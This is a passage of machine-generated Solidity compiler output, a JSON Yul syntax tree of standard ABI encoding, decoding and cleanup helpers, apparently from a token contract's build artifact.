tiveSrc":"2790:1:10","nodeType":"YulLiteral","src":"2790:1:10","type":"","value":"0"},"variables":[{"name":"offset","nativeSrc":"2780:6:10","nodeType":"YulTypedName","src":"2780:6:10","type":""}]},{"nativeSrc":"2805:63:10","nodeType":"YulAssignment","src":"2805:63:10","value":{"arguments":[{"arguments":[{"name":"headStart","nativeSrc":"2840:9:10","nodeType":"YulIdentifier","src":"2840:9:10"},{"name":"offset","nativeSrc":"2851:6:10","nodeType":"YulIdentifier","src":"2851:6:10"}],"functionName":{"name":"add","nativeSrc":"2836:3:10","nodeType":"YulIdentifier","src":"2836:3:10"},"nativeSrc":"2836:22:10","nodeType":"YulFunctionCall","src":"2836:22:10"},{"name":"dataEnd","nativeSrc":"2860:7:10","nodeType":"YulIdentifier","src":"2860:7:10"}],"functionName":{"name":"abi_decode_t_address","nativeSrc":"2815:20:10","nodeType":"YulIdentifier","src":"2815:20:10"},"nativeSrc":"2815:53:10","nodeType":"YulFunctionCall","src":"2815:53:10"},"variableNames":[{"name":"value0","nativeSrc":"2805:6:10","nodeType":"YulIdentifier","src":"2805:6:10"}]}]},{"nativeSrc":"2888:118:10","nodeType":"YulBlock","src":"2888:118:10","statements":[{"nativeSrc":"2903:16:10","nodeType":"YulVariableDeclaration","src":"2903:16:10","value":{"kind":"number","nativeSrc":"2917:2:10","nodeType":"YulLiteral","src":"2917:2:10","type":"","value":"32"},"variables":[{"name":"offset","nativeSrc":"2907:6:10","nodeType":"YulTypedName","src":"2907:6:10","type":""}]},{"nativeSrc":"2933:63:10","nodeType":"YulAssignment","src":"2933:63:10","value":{"arguments":[{"arguments":[{"name":"headStart","nativeSrc":"2968:9:10","nodeType":"YulIdentifier","src":"2968:9:10"},{"name":"offset","nativeSrc":"2979:6:10","nodeType":"YulIdentifier","src":"2979:6:10"}],"functionName":{"name":"add","nativeSrc":"2964:3:10","nodeType":"YulIdentifier","src":"2964:3:10"},"nativeSrc":"2964:22:10","nodeType":"YulFunctionCall","src":"2964:22:10"},{"name":"dataEnd","nativeSrc":"2988:7:10","nodeType":"YulIdentifier","src":"2988:7:10"}],"functionName":{"name":"abi_decode_t_uint256","nativeSrc":"2943:20:10","nodeType":"YulIdentifier","src":"2943:20:10"},"nativeSrc":"2943:53:10","nodeType":"YulFunctionCall","src":"2943:53:10"},"variableNames":[{"name":"value1","nativeSrc":"2933:6:10","nodeType":"YulIdentifier","src":"2933:6:10"}]}]}]},"name":"abi_decode_tuple_t_addresst_uint256","nativeSrc":"2539:474:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nativeSrc":"2584:9:10","nodeType":"YulTypedName","src":"2584:9:10","type":""},{"name":"dataEnd","nativeSrc":"2595:7:10","nodeType":"YulTypedName","src":"2595:7:10","type":""}],"returnVariables":[{"name":"value0","nativeSrc":"2607:6:10","nodeType":"YulTypedName","src":"2607:6:10","type":""},{"name":"value1","nativeSrc":"2615:6:10","nodeType":"YulTypedName","src":"2615:6:10","type":""}],"src":"2539:474:10"},{"body":{"nativeSrc":"3061:48:10","nodeType":"YulBlock","src":"3061:48:10","statements":[{"nativeSrc":"3071:32:10","nodeType":"YulAssignment","src":"3071:32:10","value":{"arguments":[{"arguments":[{"name":"value","nativeSrc":"3096:5:10","nodeType":"YulIdentifier","src":"3096:5:10"}],"functionName":{"name":"iszero","nativeSrc":"3089:6:10","nodeType":"YulIdentifier","src":"3089:6:10"},"nativeSrc":"3089:13:10","nodeType":"YulFunctionCall","src":"3089:13:10"}],"functionName":{"name":"iszero","nativeSrc":"3082:6:10","nodeType":"YulIdentifier","src":"3082:6:10"},"nativeSrc":"3082:21:10","nodeType":"YulFunctionCall","src":"3082:21:10"},"variableNames":[{"name":"cleaned","nativeSrc":"3071:7:10","nodeType":"YulIdentifier","src":"3071:7:10"}]}]},"name":"cleanup_t_bool","nativeSrc":"3019:90:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"3043:5:10","nodeType":"YulTypedName","src":"3043:5:10","type":""}],"returnVariables":[{"name":"cleaned","nativeSrc":"3053:7:10","nodeType":"YulTypedName","src":"3053:7:10","type":""}],"src":"3019:90:10"},{"body":{"nativeSrc":"3174:50:10","nodeType":"YulBlock","src":"3174:50:10","statements":[{"expression":{"arguments":[{"name":"pos","nativeSrc":"3191:3:10","nodeType":"YulIdentifier","src":"3191:3:10"},{"arguments":[{"name":"value","nativeSrc":"3211:5:10","nodeType":"YulIdentifier","src":"3211:5:10"}],"functionName":{"name":"cleanup_t_bool","nativeSrc":"3196:14:10","nodeType":"YulIdentifier","src":"3196:14:10"},"nativeSrc":"3196:21:10","nodeType":"YulFunctionCall","src":"3196:21:10"}],"functionName":{"name":"mstore","nativeSrc":"3184:6:10","nodeType":"YulIdentifier","src":"3184:6:10"},"nativeSrc":"3184:34:10","nodeType":"YulFunctionCall","src":"3184:34:10"},"nativeSrc":"3184:34:10","nodeType":"YulExpressionStatement","src":"3184:34:10"}]},"name":"abi_encode_t_bool_to_t_bool_fromStack","nativeSrc":"3115:109:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"3162:5:10","nodeType":"YulTypedName","src":"3162:5:10","type":""},{"name":"pos","nativeSrc":"3169:3:10","nodeType":"YulTypedName","src":"3169:3:10","type":""}],"src":"3115:109:10"},{"body":{"nativeSrc":"3322:118:10","nodeType":"YulBlock","src":"3322:118:10","statements":[{"nativeSrc":"3332:26:10","nodeType":"YulAssignment","src":"3332:26:10","value":{"arguments":[{"name":"headStart","nativeSrc":"3344:9:10","nodeType":"YulIdentifier","src":"3344:9:10"},{"kind":"number","nativeSrc":"3355:2:10","nodeType":"YulLiteral","src":"3355:2:10","type":"","value":"32"}],"functionName":{"name":"add","nativeSrc":"3340:3:10","nodeType":"YulIdentifier","src":"3340:3:10"},"nativeSrc":"3340:18:10","nodeType":"YulFunctionCall","src":"3340:18:10"},"variableNames":[{"name":"tail","nativeSrc":"3332:4:10","nodeType":"YulIdentifier","src":"3332:4:10"}]},{"expression":{"arguments":[{"name":"value0","nativeSrc":"3406:6:10","nodeType":"YulIdentifier","src":"3406:6:10"},{"arguments":[{"name":"headStart","nativeSrc":"3419:9:10","nodeType":"YulIdentifier","src":"3419:9:10"},{"kind":"number","nativeSrc":"3430:1:10","nodeType":"YulLiteral","src":"3430:1:10","type":"","value":"0"}],"functionName":{"name":"add","nativeSrc":"3415:3:10","nodeType":"YulIdentifier","src":"3415:3:10"},"nativeSrc":"3415:17:10","nodeType":"YulFunctionCall","src":"3415:17:10"}],"functionName":{"name":"abi_encode_t_bool_to_t_bool_fromStack","nativeSrc":"3368:37:10","nodeType":"YulIdentifier","src":"3368:37:10"},"nativeSrc":"3368:65:10","nodeType":"YulFunctionCall","src":"3368:65:10"},"nativeSrc":"3368:65:10","nodeType":"YulExpressionStatement","src":"3368:65:10"}]},"name":"abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed","nativeSrc":"3230:210:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nativeSrc":"3294:9:10","nodeType":"YulTypedName","src":"3294:9:10","type":""},{"name":"value0","nativeSrc":"3306:6:10","nodeType":"YulTypedName","src":"3306:6:10","type":""}],"returnVariables":[{"name":"tail","nativeSrc":"3317:4:10","nodeType":"YulTypedName","src":"3317:4:10","type":""}],"src":"3230:210:10"},{"body":{"nativeSrc":"3511:53:10","nodeType":"YulBlock","src":"3511:53:10","statements":[{"expression":{"arguments":[{"name":"pos","nativeSrc":"3528:3:10","nodeType":"YulIdentifier","src":"3528:3:10"},{"arguments":[{"name":"value","nativeSrc":"3551:5:10","nodeType":"YulIdentifier","src":"3551:5:10"}],"functionName":{"name":"cleanup_t_uint256","nativeSrc":"3533:17:10","nodeType":"YulIdentifier","src":"3533:17:10"},"nativeSrc":"3533:24:10","nodeType":"YulFunctionCall","src":"3533:24:10"}],"functionName":{"name":"mstore","nativeSrc":"3521:6:10","nodeType":"YulIdentifier","src":"3521:6:10"},"nativeSrc":"3521:37:10","nodeType":"YulFunctionCall","src":"3521:37:10"},"nativeSrc":"3521:37:10","nodeType":"YulExpressionStatement","src":"3521:37:10"}]},"name":"abi_encode_t_uint256_to_t_uint256_fromStack","nativeSrc":"3446:118:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"3499:5:10","nodeType":"YulTypedName","src":"3499:5:10","type":""},{"name":"pos","nativeSrc":"3506:3:10","nodeType":"YulTypedName","src":"3506:3:10","type":""}],"src":"3446:118:10"},{"body":{"nativeSrc":"3668:124:10","nodeType":"YulBlock","src":"3668:124:10","statements":[{"nativeSrc":"3678:26:10","nodeType":"YulAssignment","src":"3678:26:10","value":{"arguments":[{"name":"headStart","nativeSrc":"3690:9:10","nodeType":"YulIdentifier","src":"3690:9:10"},{"kind":"number","nativeSrc":"3701:2:10","nodeType":"YulLiteral","src":"3701:2:10","type":"","value":"32"}],"functionName":{"name":"add","nativeSrc":"3686:3:10","nodeType":"YulIdentifier","src":"3686:3:10"},"nativeSrc":"3686:18:10","nodeType":"YulFunctionCall","src":"3686:18:10"},"variableNames":[{"name":"tail","nativeSrc":"3678:4:10","nodeType":"YulIdentifier","src":"3678:4:10"}]},{"expression":{"arguments":[{"name":"value0","nativeSrc":"3758:6:10","nodeType":"YulIdentifier","src":"3758:6:10"},{"arguments":[{"name":"headStart","nativeSrc":"3771:9:10","nodeType":"YulIdentifier","src":"3771:9:10"},{"kind":"number","nativeSrc":"3782:1:10","nodeType":"YulLiteral","src":"3782:1:10","type":"","value":"0"}],"functionName":{"name":"add","nativeSrc":"3767:3:10","nodeType":"YulIdentifier","src":"3767:3:10"},"nativeSrc":"3767:17:10","nodeType":"YulFunctionCall","src":"3767:17:10"}],"functionName":{"name":"abi_encode_t_uint256_to_t_uint256_fromStack","nativeSrc":"3714:43:10","nodeType":"YulIdentifier","src":"3714:43:10"},"nativeSrc":"3714:71:10","nodeType":"YulFunctionCall","src":"3714:71:10"},"nativeSrc":"3714:71:10","nodeType":"YulExpressionStatement","src":"3714:71:10"}]},"name":"abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed","nativeSrc":"3570:222:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nativeSrc":"3640:9:10","nodeType":"YulTypedName","src":"3640:9:10","type":""},{"name":"value0","nativeSrc":"3652:6:10","nodeType":"YulTypedName","src":"3652:6:10","type":""}],"returnVariables":[{"name":"tail","nativeSrc":"3663:4:10","nodeType":"YulTypedName","src":"3663:4:10","type":""}],"src":"3570:222:10"},{"body":{"nativeSrc":"3898:519:10","nodeType":"YulBlock","src":"3898:519:10","statements":[{"body":{"nativeSrc":"3944:83:10","nodeType":"YulBlock","src":"3944:83:10","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nativeSrc":"3946:77:10","nodeType":"YulIdentifier","src":"3946:77:10"},"nativeSrc":"3946:79:10","nodeType":"YulFunctionCall","src":"3946:79:10"},"nativeSrc":"3946:79:10","nodeType":"YulExpressionStatement","src":"3946:79:10"}]},"condition":{"arguments":[{"arguments":[{"name":"dataEnd","nativeSrc":"3919:7:10","nodeType":"YulIdentifier","src":"3919:7:10"},{"name":"headStart","nativeSrc":"3928:9:10","nodeType":"YulIdentifier","src":"3928:9:10"}],"functionName":{"name":"sub","nativeSrc":"3915:3:10","nodeType":"YulIdentifier","src":"3915:3:10"},"nativeSrc":"3915:23:10","nodeType":"YulFunctionCall","src":"3915:23:10"},{"kind":"number","nativeSrc":"3940:2:10","nodeType":"YulLiteral","src":"3940:2:10","type":"","value":"96"}],"functionName":{"name":"slt","nativeSrc":"3911:3:10","nodeType":"YulIdentifier","src":"3911:3:10"},"nativeSrc":"3911:32:10","nodeType":"YulFunctionCall","src":"3911:32:10"},"nativeSrc":"3908:119:10","nodeType":"YulIf","src":"3908:119:10"},{"nativeSrc":"4037:117:10","nodeType":"YulBlock","src":"4037:117:10","statements":[{"nativeSrc":"4052:15:10","nodeType":"YulVariableDeclaration","src":"4052:15:10","value":{"kind":"number","nativeSrc":"4066:1:10","nodeType":"YulLiteral","src":"4066:1:10","type":"","value":"0"},"variables":[{"name":"offset","nativeSrc":"4056:6:10","nodeType":"YulTypedName","src":"4056:6:10","type":""}]},{"nativeSrc":"4081:63:10","nodeType":"YulAssignment","src":"4081:63:10","value":{"arguments":[{"arguments":[{"name":"headStart","nativeSrc":"4116:9:10","nodeType":"YulIdentifier","src":"4116:9:10"},{"name":"offset","nativeSrc":"4127:6:10","nodeType":"YulIdentifier","src":"4127:6:10"}],"functionName":{"name":"add","nativeSrc":"4112:3:10","nodeType":"YulIdentifier","src":"4112:3:10"},"nativeSrc":"4112:22:10","nodeType":"YulFunctionCall","src":"4112:22:10"},{"name":"dataEnd","nativeSrc":"4136:7:10","nodeType":"YulIdentifier","src":"4136:7:10"}],"functionName":{"name":"abi_decode_t_address","nativeSrc":"4091:20:10","nodeType":"YulIdentifier","src":"4091:20:10"},"nativeSrc":"4091:53:10","nodeType":"YulFunctionCall","src":"4091:53:10"},"variableNames":[{"name":"value0","nativeSrc":"4081:6:10","nodeType":"YulIdentifier","src":"4081:6:10"}]}]},{"nativeSrc":"4164:118:10","nodeType":"YulBlock","src":"4164:118:10","statements":[{"nativeSrc":"4179:16:10","nodeType":"YulVariableDeclaration","src":"4179:16:10","value":{"kind":"number","nativeSrc":"4193:2:10","nodeType":"YulLiteral","src":"4193:2:10","type":"","value":"32"},"variables":[{"name":"offset","nativeSrc":"4183:6:10","nodeType":"YulTypedName","src":"4183:6:10","type":""}]},{"nativeSrc":"4209:63:10","nodeType":"YulAssignment","src":"4209:63:10","value":{"arguments":[{"arguments":[{"name":"headStart","nativeSrc":"4244:9:10","nodeType":"YulIdentifier","src":"4244:9:10"},{"name":"offset","nativeSrc":"4255:6:10","nodeType":"YulIdentifier","src":"4255:6:10"}],"functionName":{"name":"add","nativeSrc":"4240:3:10","nodeType":"YulIdentifier","src":"4240:3:10"},"nativeSrc":"4240:22:10","nodeType":"YulFunctionCall","src":"4240:22:10"},{"name":"dataEnd","nativeSrc":"4264:7:10","nodeType":"YulIdentifier","src":"4264:7:10"}],"functionName":{"name":"abi_decode_t_address","nativeSrc":"4219:20:10","nodeType":"YulIdentifier","src":"4219:20:10"},"nativeSrc":"4219:53:10","nodeType":"YulFunctionCall","src":"4219:53:10"},"variableNames":[{"name":"value1","nativeSrc":"4209:6:10","nodeType":"YulIdentifier","src":"4209:6:10"}]}]},{"nativeSrc":"4292:118:10","nodeType":"YulBlock","src":"4292:118:10","statements":[{"nativeSrc":"4307:16:10","nodeType":"YulVariableDeclaration","src":"4307:16:10","value":{"kind":"number","nativeSrc":"4321:2:10","nodeType":"YulLiteral","src":"4321:2:10","type":"","value":"64"},"variables":[{"name":"offset","nativeSrc":"4311:6:10","nodeType":"YulTypedName","src":"4311:6:10","type":""}]},{"nativeSrc":"4337:63:10","nodeType":"YulAssignment","src":"4337:63:10","value":{"arguments":[{"arguments":[{"name":"headStart","nativeSrc":"4372:9:10","nodeType":"YulIdentifier","src":"4372:9:10"},{"name":"offset","nativeSrc":"4383:6:10","nodeType":"YulIdentifier","src":"4383:6:10"}],"functionName":{"name":"add","nativeSrc":"4368:3:10","nodeType":"YulIdentifier","src":"4368:3:10"},"nativeSrc":"4368:22:10","nodeType":"YulFunctionCall","src":"4368:22:10"},{"name":"dataEnd","nativeSrc":"4392:7:10","nodeType":"YulIdentifier","src":"4392:7:10"}],"functionName":{"name":"abi_decode_t_uint256","nativeSrc":"4347:20:10","nodeType":"YulIdentifier","src":"4347:20:10"},"nativeSrc":"4347:53:10","nodeType":"YulFunctionCall","src":"4347:53:10"},"variableNames":[{"name":"value2","nativeSrc":"4337:6:10","nodeType":"YulIdentifier","src":"4337:6:10"}]}]}]},"name":"abi_decode_tuple_t_addresst_addresst_uint256","nativeSrc":"3798:619:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nativeSrc":"3852:9:10","nodeType":"YulTypedName","src":"3852:9:10","type":""},{"name":"dataEnd","nativeSrc":"3863:7:10","nodeType":"YulTypedName","src":"3863:7:10","type":""}],"returnVariables":[{"name":"value0","nativeSrc":"3875:6:10","nodeType":"YulTypedName","src":"3875:6:10","type":""},{"name":"value1","nativeSrc":"3883:6:10","nodeType":"YulTypedName","src":"3883:6:10","type":""},{"name":"value2","nativeSrc":"3891:6:10","nodeType":"YulTypedName","src":"3891:6:10","type":""}],"src":"3798:619:10"},{"body":{"nativeSrc":"4466:43:10","nodeType":"YulBlock","src":"4466:43:10","statements":[{"nativeSrc":"4476:27:10","nodeType":"YulAssignment","src":"4476:27:10","value":{"arguments":[{"name":"value","nativeSrc":"4491:5:10","nodeType":"YulIdentifier","src":"4491:5:10"},{"kind":"number","nativeSrc":"4498:4:10","nodeType":"YulLiteral","src":"4498:4:10","type":"","value":"0xff"}],"functionName":{"name":"and","nativeSrc":"4487:3:10","nodeType":"YulIdentifier","src":"4487:3:10"},"nativeSrc":"4487:16:10","nodeType":"YulFunctionCall","src":"4487:16:10"},"variableNames":[{"name":"cleaned","nativeSrc":"4476:7:10","nodeType":"YulIdentifier","src":"4476:7:10"}]}]},"name":"cleanup_t_uint8","nativeSrc":"4423:86:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"4448:5:10","nodeType":"YulTypedName","src":"4448:5:10","type":""}],"returnVariables":[{"name":"cleaned","nativeSrc":"4458:7:10","nodeType":"YulTypedName","src":"4458:7:10","type":""}],"src":"4423:86:10"},{"body":{"nativeSrc":"4576:51:10","nodeType":"YulBlock","src":"4576:51:10","statements":[{"expression":{"arguments":[{"name":"pos","nativeSrc":"4593:3:10","nodeType":"YulIdentifier","src":"4593:3:10"},{"arguments":[{"name":"value","nativeSrc":"4614:5:10","nodeType":"YulIdentifier","src":"4614:5:10"}],"functionName":{"name":"cleanup_t_uint8","nativeSrc":"4598:15:10","nodeType":"YulIdentifier","src":"4598:15:10"},"nativeSrc":"4598:22:10","nodeType":"YulFunctionCall","src":"4598:22:10"}],"functionName":{"name":"mstore","nativeSrc":"4586:6:10","nodeType":"YulIdentifier","src":"4586:6:10"},"nativeSrc":"4586:35:10","nodeType":"YulFunctionCall","src":"4586:35:10"},"nativeSrc":"4586:35:10","nodeType":"YulExpressionStatement","src":"4586:35:10"}]},"name":"abi_encode_t_uint8_to_t_uint8_fromStack","nativeSrc":"4515:112:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"4564:5:10","nodeType":"YulTypedName","src":"4564:5:10","type":""},{"name":"pos","nativeSrc":"4571:3:10","nodeType":"YulTypedName","src":"4571:3:10","type":""}],"src":"4515:112:10"},{"body":{"nativeSrc":"4727:120:10","nodeType":"YulBlock","src":"4727:120:10","statements":[{"nativeSrc":"4737:26:10","nodeType":"YulAssignment","src":"4737:26:10","value":{"arguments":[{"name":"headStart","nativeSrc":"4749:9:10","nodeType":"YulIdentifier","src":"4749:9:10"},{"kind":"number","nativeSrc":"4760:2:10","nodeType":"YulLiteral","src":"4760:2:10","type":"","value":"32"}],"functionName":{"name":"add","nativeSrc":"4745:3:10","nodeType":"YulIdentifier","src":"4745:3:10"},"nativeSrc":"4745:18:10","nodeType":"YulFunctionCall","src":"4745:18:10"},"variableNames":[{"name":"tail","nativeSrc":"4737:4:10","nodeType":"YulIdentifier","src":"4737:4:10"}]},{"expression":{"arguments":[{"name":"value0","nativeSrc":"4813:6:10","nodeType":"YulIdentifier","src":"4813:6:10"},{"arguments":[{"name":"headStart","nativeSrc":"4826:9:10","nodeType":"YulIdentifier","src":"4826:9:10"},{"kind":"number","nativeSrc":"4837:1:10","nodeType":"YulLiteral","src":"4837:1:10","type":"","value":"0"}],"functionName":{"name":"add","nativeSrc":"4822:3:10","nodeType":"YulIdentifier","src":"4822:3:10"},"nativeSrc":"4822:17:10","nodeType":"YulFunctionCall","src":"4822:17:10"}],"functionName":{"name":"abi_encode_t_uint8_to_t_uint8_fromStack","nativeSrc":"4773:39:10","nodeType":"YulIdentifier","src":"4773:39:10"},"nativeSrc":"4773:67:10","nodeType":"YulFunctionCall","src":"4773:67:10"},"nativeSrc":"4773:67:10","nodeType":"YulExpressionStatement","src":"4773:67:10"}]},"name":"abi_encode_tuple_t_uint8__to_t_uint8__fromStack_reversed","nativeSrc":"4633:214:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nativeSrc":"4699:9:10","nodeType":"YulTypedName","src":"4699:9:10","type":""},{"name":"value0","nativeSrc":"4711:6:10","nodeType":"YulTypedName","src":"4711:6:10","type":""}],"returnVariables":[{"name":"tail","nativeSrc":"4722:4:10","nodeType":"YulTypedName","src":"4722:4:10","type":""}],"src":"4633:214:10"},{"body":{"nativeSrc":"4919:263:10","nodeType":"YulBlock","src":"4919:263:10","statements":[{"body":{"nativeSrc":"4965:83:10","nodeType":"YulBlock","src":"4965:83:10","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nativeSrc":"4967:77:10","nodeType":"YulIdentifier","src":"4967:77:10"},"nativeSrc":"4967:79:10","nodeType":"YulFunctionCall","src":"4967:79:10"},"nativeSrc":"4967:79:10","nodeType":"YulExpressionStatement","src":"4967:79:10"}]},"condition":{"arguments":[{"arguments":[{"name":"dataEnd","nativeSrc":"4940:7:10","nodeType":"YulIdentifier","src":"4940:7:10"},{"name":"headStart","nativeSrc":"4949:9:10","nodeType":"YulIdentifier","src":"4949:9:10"}],"functionName":{"name":"sub","nativeSrc":"4936:3:10","nodeType":"YulIdentifier","src":"4936:3:10"},"nativeSrc":"4936:23:10","nodeType":"YulFunctionCall","src":"4936:23:10"},{"kind":"number","nativeSrc":"4961:2:10","nodeType":"YulLiteral","src":"4961:2:10","type":"","value":"32"}],"functionName":{"name":"slt","nativeSrc":"4932:3:10","nodeType":"YulIdentifier","src":"4932:3:10"},"nativeSrc":"4932:32:10","nodeType":"YulFunctionCall","src":"4932:32:10"},"nativeSrc":"4929:119:10","nodeType":"YulIf","src":"4929:119:10"},{"nativeSrc":"5058:117:10","nodeType":"YulBlock","src":"5058:117:10","statements":[{"nativeSrc":"5073:15:10","nodeType":"YulVariableDeclaration","src":"5073:15:10","value":{"kind":"number","nativeSrc":"5087:1:10","nodeType":"YulLiteral","src":"5087:1:10","type":"","value":"0"},"variables":[{"name":"offset","nativeSrc":"5077:6:10","nodeType":"YulTypedName","src":"5077:6:10","type":""}]},{"nativeSrc":"5102:63:10","nodeType":"YulAssignment","src":"5102:63:10","value":{"arguments":[{"arguments":[{"name":"headStart","nativeSrc":"5137:9:10","nodeType":"YulIdentifier","src":"5137:9:10"},{"name":"offset","nativeSrc":"5148:6:10","nodeType":"YulIdentifier","src":"5148:6:10"}],"functionName":{"name":"add","nativeSrc":"5133:3:10","nodeType":"YulIdentifier","src":"5133:3:10"},"nativeSrc":"5133:22:10","nodeType":"YulFunctionCall","src":"5133:22:10"},{"name":"dataEnd","nativeSrc":"5157:7:10","nodeType":"YulIdentifier","src":"5157:7:10"}],"functionName":{"name":"abi_decode_t_address","nativeSrc":"5112:20:10","nodeType":"YulIdentifier","src":"5112:20:10"},"nativeSrc":"5112:53:10","nodeType":"YulFunctionCall","src":"5112:53:10"},"variableNames":[{"name":"value0","nativeSrc":"5102:6:10","nodeType":"YulIdentifier","src":"5102:6:10"}]}]}]},"name":"abi_decode_tuple_t_address","nativeSrc":"4853:329:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nativeSrc":"4889:9:10","nodeType":"YulTypedName","src":"4889:9:10","type":""},{"name":"dataEnd","nativeSrc":"4900:7:10","nodeType":"YulTypedName","src":"4900:7:10","type":""}],"returnVariables":[{"name":"value0","nativeSrc":"4912:6:10","nodeType":"YulTypedName","src":"4912:6:10","type":""}],"src":"4853:329:10"},{"body":{"nativeSrc":"5253:53:10","nodeType":"YulBlock","src":"5253:53:10","statements":[{"expression":{"arguments":[{"name":"pos","nativeSrc":"5270:3:10","nodeType":"YulIdentifier","src":"5270:3:10"},{"arguments":[{"name":"value","nativeSrc":"5293:5:10","nodeType":"YulIdentifier","src":"5293:5:10"}],"functionName":{"name":"cleanup_t_address","nativeSrc":"5275:17:10","nodeType":"YulIdentifier","src":"5275:17:10"},"nativeSrc":"5275:24:10","nodeType":"YulFunctionCall","src":"5275:24:10"}],"functionName":{"name":"mstore","nativeSrc":"5263:6:10","nodeType":"YulIdentifier","src":"5263:6:10"},"nativeSrc":"5263:37:10","nodeType":"YulFunctionCall","src":"5263:37:10"},"nativeSrc":"5263:37:10","nodeType":"YulExpressionStatement","src":"5263:37:10"}]},"name":"abi_encode_t_address_to_t_address_fromStack","nativeSrc":"5188:118:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"5241:5:10","nodeType":"YulTypedName","src":"5241:5:10","type":""},{"name":"pos","nativeSrc":"5248:3:10","nodeType":"YulTypedName","src":"5248:3:10","type":""}],"src":"5188:118:10"},{"body":{"nativeSrc":"5410:124:10","nodeType":"YulBlock","src":"5410:124:10","statements":[{"nativeSrc":"5420:26:10","nodeType":"YulAssignment","src":"5420:26:10","value":{"arguments":[{"name":"headStart","nativeSrc":"5432:9:10","nodeType":"YulIdentifier","src":"5432:9:10"},{"kind":"number","nativeSrc":"5443:2:10","nodeType":"YulLiteral","src":"5443:2:10","type":"","value":"32"}],"functionName":{"name":"add","nativeSrc":"5428:3:10","nodeType":"YulIdentifier","src":"5428:3:10"},"nativeSrc":"5428:18:10","nodeType":"YulFunctionCall","src":"5428:18:10"},"variableNames":[{"name":"tail","nativeSrc":"5420:4:10","nodeType":"YulIdentifier","src":"5420:4:10"}]},{"expression":{"arguments":[{"name":"value0","nativeSrc":"5500:6:10","nodeType":"YulIdentifier","src":"5500:6:10"},{"arguments":[{"name":"headStart","nativeSrc":"5513:9:10","nodeType":"YulIdentifier","src":"5513:9:10"},{"kind":"number","nativeSrc":"5524:1:10","nodeType":"YulLiteral","src":"5524:1:10","type":"","value":"0"}],"functionName":{"name":"add","nativeSrc":"5509:3:10","nodeType":"YulIdentifier","src":"5509:3:10"},"nativeSrc":"5509:17:10","nodeType":"YulFunctionCall","src":"5509:17:10"}],"functionName":{"name":"abi_encode_t_address_to_t_address_fromStack","nativeSrc":"5456:43:10","nodeType":"YulIdentifier","src":"5456:43:10"},"nativeSrc":"5456:71:10","nodeType":"YulFunctionCall","src":"5456:71:10"},"nativeSrc":"5456:71:10","nodeType":"YulExpressionStatement","src":"5456:71:10"}]},"name":"abi_encode_tuple_t_address__to_t_address__fromStack_reversed","nativeSrc":"5312:222:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nativeSrc":"5382:9:10","nodeType":"YulTypedName","src":"5382:9:10","type":""},{"name":"value0","nativeSrc":"5394:6:10","nodeType":"YulTypedName","src":"5394:6:10","type":""}],"returnVariables":[{"name":"tail","nativeSrc":"5405:4:10","nodeType":"YulTypedName","src":"5405:4:10","type":""}],"src":"5312:222:10"},{"body":{"nativeSrc":"5623:391:10","nodeType":"YulBlock","src":"5623:391:10","statements":[{"body":{"nativeSrc":"5669:83:10","nodeType":"YulBlock","src":"5669:83:10","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nativeSrc":"5671:77:10","nodeType":"YulIdentifier","src":"5671:77:10"},"nativeSrc":"5671:79:10","nodeType":"YulFunctionCall","src":"5671:79:10"},"nativeSrc":"5671:79:10","nodeType":"YulExpressionStatement","src":"5671:79:10"}]},"condition":{"arguments":[{"arguments":[{"name":"dataEnd","nativeSrc":"5644:7:10","nodeType":"YulIdentifier","src":"5644:7:10"},{"name":"headStart","nativeSrc":"5653:9:10","nodeType":"YulIdentifier","src":"5653:9:10"}],"functionName":{"name":"sub","nativeSrc":"5640:3:10","nodeType":"YulIdentifier","src":"5640:3:10"},"nativeSrc":"5640:23:10","nodeType":"YulFunctionCall","src":"5640:23:10"},{"kind":"number","nativeSrc":"5665:2:10","nodeType":"YulLiteral","src":"5665:2:10","type":"","value":"64"}],"functionName":{"name":"slt","nativeSrc":"5636:3:10","nodeType":"YulIdentifier","src":"5636:3:10"},"nativeSrc":"5636:32:10","nodeType":"YulFunctionCall","src":"5636:32:10"},"nativeSrc":"5633:119:10","nodeType":"YulIf","src":"5633:119:10"},{"nativeSrc":"5762:117:10","nodeType":"YulBlock","src":"5762:117:10","statements":[{"nativeSrc":"5777:15:10","nodeType":"YulVariableDeclaration","src":"5777:15:10","value":{"kind":"number","nativeSrc":"5791:1:10","nodeType":"YulLiteral","src":"5791:1:10","type":"","value":"0"},"variables":[{"name":"offset","nativeSrc":"5781:6:10","nodeType":"YulTypedName","src":"5781:6:10","type":""}]},{"nativeSrc":"5806:63:10","nodeType":"YulAssignment","src":"5806:63:10","value":{"arguments":[{"arguments":[{"name":"headStart","nativeSrc":"5841:9:10","nodeType":"YulIdentifier","src":"5841:9:10"},{"name":"offset","nativeSrc":"5852:6:10","nodeType":"YulIdentifier","src":"5852:6:10"}],"functionName":{"name":"add","nativeSrc":"5837:3:10","nodeType":"YulIdentifier","src":"5837:3:10"},"nativeSrc":"5837:22:10","nodeType":"YulFunctionCall","src":"5837:22:10"},{"name":"dataEnd","nativeSrc":"5861:7:10","nodeType":"YulIdentifier","src":"5861:7:10"}],"functionName":{"name":"abi_decode_t_address","nativeSrc":"5816:20:10","nodeType":"YulIdentifier","src":"5816:20:10"},"nativeSrc":"5816:53:10","nodeType":"YulFunctionCall","src":"5816:53:10"},"v